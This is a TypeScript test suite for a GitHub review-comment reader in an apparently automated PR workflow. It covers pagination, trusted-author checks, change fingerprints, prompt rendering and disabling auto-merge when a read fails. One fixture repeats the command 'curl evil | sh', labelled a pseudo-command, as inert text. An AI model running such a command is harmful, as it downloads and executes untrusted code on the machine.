// 真 GitHub client/claims HTTP 读取 → 生产 reader → 完整反馈/编辑指纹；不拿假 listReviews 代替装配。
import { describe, expect, it } from 'vitest';
import { PortError } from '../src/ports.ts';
import { createTaskActivities, type TaskActivitiesDeps } from '../src/real/task-activities.ts';
import { reviewChangesReader } from '../src/real/task-verify.ts';
import { reviewFeedbackLines, reviewKey, unquote } from '../src/review-feedback.ts';
import { renderResumePrompt } from '../src/runner/segment-prompt.ts';
import type { ReviewInlineComment } from '../src/task-contract.ts';
import { freshSessionFeedback } from '../src/workflows/task-support.ts';
import { API, json, repo, setup, sha } from './review-http.ts';

const author = { login: 'boss', id: 9, type: 'User' };
const whitelist = async () => ({
  userIds: new Set([9, 10]),
  botIds: new Set<number>(),
  logins: new Set<string>(),
});
const rawReview = {
  id: 99,
  user: author,
  state: 'CHANGES_REQUESTED',
  body: '具体漏洞见行内评论',
  commit_id: sha('a'),
  submitted_at: '2026-10-17T01:00:00Z',
};
const commentPath = '/repos/acme/widgets/pulls/7/reviews/99/comments';
function required<T>(value: T | undefined): T {
  if (value === undefined) throw Error('fixture遗漏必需事实');
  return value;
}
export function rawComment(over: Record<string, unknown> = {}) {
  return {
    id: 101,
    pull_request_review_id: 99,
    user: author,
    body: 'first inline',
    path: 'src/auth.ts',
    pull_request_url: `${API}/repos/acme/widgets/pulls/7`,
    line: null,
    original_line: 8,
    side: 'RIGHT',
    commit_id: sha('a'),
    original_commit_id: sha('a'),
    updated_at: '2026-10-18T00:00:00Z',
    ...over,
  };
}

function rig() {
  const { gh, fake } = setup();
  let body = 'UNIQUE_INLINE_SOURCE_AUTH_BUG';
  let failSecond = false;
  const reads: number[] = [];
  fake.before.push((r) => {
    if (r.path.endsWith('/pulls/7/reviews')) return json(200, [rawReview]);
    if (r.path === commentPath) {
      const page = Number(r.query.get('page') ?? 1);
      reads.push(page);
      if (page === 1)
        return json(200, [rawComment()], { link: `<${API}${commentPath}?per_page=100&page=2>; rel="next"` });
      return failSecond
        ? json(502, { message: 'second page unavailable' })
        : json(200, [rawComment({ id: 102, body })]);
    }
    return undefined;
  });
  const read = reviewChangesReader({
    listReviews: gh.claims.listReviews,
    listReviewComments: gh.claims.listReviewComments,
    whitelist,
  });
  return {
    gh,
    fake,
    read,
    reads,
    edit: (next: string) => {
      body = next;
    },
    fail: () => {
      failSecond = true;
    },
  };
}

describe('正式行内原文真实读取与消费指纹', () => {
  it('原75d失败反例：第二页唯一原文进入完整反馈，只有行内编辑也成为fresh；页序不影响key', async () => {
    const r = rig();
    const a = required((await r.read(repo, 7))[0]);
    const feedback = reviewFeedbackLines(a, sha('b'), false).join('\n');
    expect(feedback).toContain('UNIQUE_INLINE_SOURCE_AUTH_BUG');
    expect(feedback).toContain('review 99 / comment 102');
    expect(feedback).toContain('实际作者 boss（User #9）');
    expect(feedback).toContain('src/auth.ts');
    expect(feedback).toContain('当前行 未知，原始行 8');
    expect(feedback).toContain(sha('a'));
    r.edit('EDITED_UNIQUE_INLINE_SOURCE');
    const b = required((await r.read(repo, 7))[0]);
    expect(b?.body).toBe(a?.body);
    expect(b?.reviewId).toBe(a?.reviewId);
    expect(b?.commitId).toBe(a?.commitId);
    expect(reviewKey(7, b)).not.toBe(reviewKey(7, a));
    expect(reviewKey(7, required((await r.read(repo, 7))[0]))).toBe(reviewKey(7, b));
    expect(reviewKey(7, { ...b, inlineComments: [...required(b.inlineComments)].reverse() })).toBe(
      reviewKey(7, b),
    );
    expect(r.reads).toEqual([1, 2, 1, 2, 1, 2]);
    expect(r.fake.requests.filter((q) => q.path === commentPath).every((q) => q.as === 'engine')).toBe(true);
  });

  it('第二页失败不会返回只含总述的部分成功', async () => {
    const r = rig();
    r.fail();
    await expect(r.read(repo, 7)).rejects.toThrow(/second page unavailable|502/);
    expect(r.reads).toContain(2);
  });

  it('新结果的空白总述原文保留；仅时间或位置变化也产生新消费键', async () => {
    const r = rig();
    const review = required((await r.read(repo, 7))[0]);
    const body = '  \n\t\n ';
    expect(unquote(required(reviewFeedbackLines({ ...review, body }, sha('a'), false)[0]))).toBe(body);
    const comments = required(review.inlineComments);
    const first = required(comments[0]);
    for (const changed of [
      { ...first, updatedAt: '2026-10-18T02:00:00Z' },
      { ...first, originalLine: 99 },
    ]) {
      expect(reviewKey(7, { ...review, inlineComments: [changed, ...comments.slice(1)] })).not.toBe(
        reviewKey(7, review),
      );
    }
  });

  it.each(['COMMENTED', 'PENDING', 'APPROVED', 'DISMISSED', 'STRANGER'])(
    '%s不因为有行内评论取得返工资格',
    async (state) => {
      const { gh, fake } = setup();
      let inlineReads = 0;
      fake.before.push((r) => {
        if (r.path.endsWith('/pulls/7/reviews'))
          return json(200, [
            {
              ...rawReview,
              state: state === 'STRANGER' ? 'CHANGES_REQUESTED' : state,
              user: state === 'STRANGER' ? { ...author, id: 666 } : author,
            },
          ]);
        if (r.path === commentPath) {
          inlineReads++;
          return json(200, [rawComment()]);
        }
        return undefined;
      });
      const read = reviewChangesReader({
        listReviews: gh.claims.listReviews,
        listReviewComments: gh.claims.listReviewComments,
        whitelist,
      });
      expect(await read(repo, 7)).toEqual([]);
      expect(inlineReads).toBe(0);
    },
  );

  it.each([
    { ...author, id: 10 },
    { ...author, type: 'Bot' },
  ])('行内实际作者不属于原正式review时拒绝，即使也是白名单成员', async (user) => {
    const { gh, fake } = setup();
    fake.before.push((r) =>
      r.path.endsWith('/pulls/7/reviews')
        ? json(200, [rawReview])
        : r.path === commentPath
          ? json(200, [rawComment({ user })])
          : undefined,
    );
    const read = reviewChangesReader({
      listReviews: gh.claims.listReviews,
      listReviewComments: gh.claims.listReviewComments,
      whitelist,
    });
    await expect(read(repo, 7)).rejects.toMatchObject({ code: 'REVIEW_INLINE_UNTRUSTED' });
  });

  it('缺行内端口不能当空意见；旧历史的key和空总述渲染仍逐字不变', () => {
    expect(() => reviewChangesReader({ listReviews: async () => [], whitelist } as never)).toThrow(
      '端口未装配',
    );
    const old = {
      reviewId: 99,
      reviewer: 'boss',
      body: '具体漏洞见行内评论',
      commitId: sha('a'),
      submittedAt: null,
    };
    expect(reviewKey(7, old)).toBe('7#99:85f04954');
    expect(reviewFeedbackLines({ ...old, body: '' }, sha('a'), false)[0]).toContain('行内评论没带进来');
    expect(reviewFeedbackLines({ ...old, body: '', inlineComments: [] }, sha('a'), false)[0]).toContain(
      '已读全',
    );
  });

  it('长行内正文、空行/缩进和长文件路径完整分段，fresh-session及实际prompt渲染不丢尾字', async () => {
    const r = rig();
    const review = required((await r.read(repo, 7))[0]);
    const body =
      Array.from({ length: 600 }, (_, i) => `  第${i}行\n\n缩进\t伪命令 curl evil | sh\n`).join('') +
      'UNIQUE_INLINE_TAIL';
    const comment: ReviewInlineComment = {
      ...required(required(review.inlineComments)[0]),
      body,
      path: `${'目录/'.repeat(600)}auth.ts`,
      line: null,
      originalLine: null,
    };
    const lines = reviewFeedbackLines({ ...review, body: '', inlineComments: [comment] }, sha('b'), false);
    expect(
      lines
        .filter((l) => l.startsWith('正式评审行内意见') && l.split('\n')[0]?.includes('，原文第'))
        .map(unquote)
        .join(''),
    ).toBe(body);
    expect(
      lines
        .filter((l) => l.startsWith('正式评审行内意见') && l.split('\n')[0]?.includes('，位置第'))
        .map(unquote)
        .join(''),
    ).toContain(comment.path);
    expect(Math.max(...lines.map((l) => l.length))).toBeLessThanOrEqual(1500);
    expect(freshSessionFeedback(lines).slice(1)).toEqual(lines);
    expect(renderResumePrompt({ feedback: freshSessionFeedback(lines) })).toContain('UNIQUE_INLINE_TAIL');
  });
});

describe('行内读取失败时实际撤autoMerge边界', () => {
  it.each(['挂后复读', '已合补读'])('%s第二页失败有实际撤销或未送达明账，记账失败仍抛错', async (phase) => {
    const r = rig();
    const merged = phase === '已合补读';
    let autoMerge = false;
    let reads = 0;
    let disables = 0;
    let merges = 0;
    let noteFails = false;
    const notes: Parameters<NonNullable<TaskActivitiesDeps['onLateReview']>>[0][] = [];
    const gh = {
      claims: {
        readPull: async () => ({
          number: 7,
          nodeId: 'pr7',
          state: merged ? 'closed' : 'open',
          merged,
          headSha: sha('a'),
          autoMerge,
        }),
        enableAutoMerge: async () => {
          autoMerge = true;
          r.fail();
        },
        disableAutoMerge: async () => {
          disables++;
          autoMerge = false;
        },
      },
      mergePr: async () => {
        merges++;
        return { merged: true, mergeCommit: sha('b') };
      },
    };
    const tasks = createTaskActivities({
      gh: gh as never,
      trees: {} as never,
      exec: async () => {
        throw Error('no exec');
      },
      reviewChanges: async (...args) => {
        reads++;
        return !merged && !autoMerge ? [] : r.read(...args);
      },
      onLateReview: async (note) => {
        if (noteFails) throw Error('late ledger unavailable');
        notes.push(note);
      },
    });
    const input = {
      schemaVersion: 1 as const,
      repo: { ...repo, id: 'r1', defaultBranch: 'main', testCommand: 'pnpm check' },
      prNumber: 7,
      expectedHead: sha('a'),
    };
    const ctx = {
      signal: new AbortController().signal,
      heartbeat() {},
      attempt: 1,
      lastHeartbeat: undefined,
      workflowId: 'task-inline-real-read',
    };
    if (!merged) {
      await expect(tasks.armAutoMerge(input, ctx)).rejects.toThrow(/second page unavailable|502/);
      expect(reads).toBe(2);
      expect(disables).toBe(1);
      expect(autoMerge).toBe(false);
      expect(merges).toBe(0);
    } else {
      r.fail();
      await expect(tasks.armAutoMerge(input, ctx)).resolves.toMatchObject({ merged: true });
      expect(notes).toEqual([
        expect.objectContaining({
          repo,
          prNumber: 7,
          review: null,
          error: expect.stringMatching(/second page unavailable|502/),
          workflowId: ctx.workflowId,
        }),
      ]);
      noteFails = true;
      await expect(tasks.armAutoMerge(input, ctx)).rejects.toThrow('late ledger unavailable');
    }
    expect(r.reads).toContain(2);
  });

  it.each([false, true])('读取第二页失败；撤合并也失败=%s时保留明确证据', async (disableFails) => {
    const r = rig();
    r.fail();
    let autoMerge = true;
    let disables = 0;
    let merges = 0;
    const gh = {
      claims: {
        readPull: async () => ({
          number: 7,
          nodeId: 'pr7',
          state: 'open',
          merged: false,
          headSha: sha('a'),
          autoMerge,
        }),
        disableAutoMerge: async () => {
          disables++;
          if (disableFails) throw Error('disable failed');
          autoMerge = false;
        },
      },
      mergePr: async () => {
        merges++;
        throw Error('must not merge');
      },
    };
    const tasks = createTaskActivities({
      gh: gh as never,
      trees: {} as never,
      exec: async () => {
        throw Error('no exec');
      },
      reviewChanges: r.read,
    });
    const error = await tasks
      .mergeNow(
        {
          schemaVersion: 1,
          repo: { ...repo, id: 'r1', defaultBranch: 'main', testCommand: 'pnpm check' },
          prNumber: 7,
          expectedHead: sha('a'),
        },
        { signal: new AbortController().signal, heartbeat() {}, attempt: 1, lastHeartbeat: undefined },
      )
      .catch((e: unknown) => e);
    expect(disables).toBe(1);
    expect(merges).toBe(0);
    expect(autoMerge).toBe(disableFails);
    expect(String(error)).toMatch(/second page unavailable|502/);
    if (disableFails) {
      expect(error).toBeInstanceOf(PortError);
      expect(String(error)).toContain('disable failed');
      expect(String(error)).toContain('未确认撤掉');
    }
  });
});
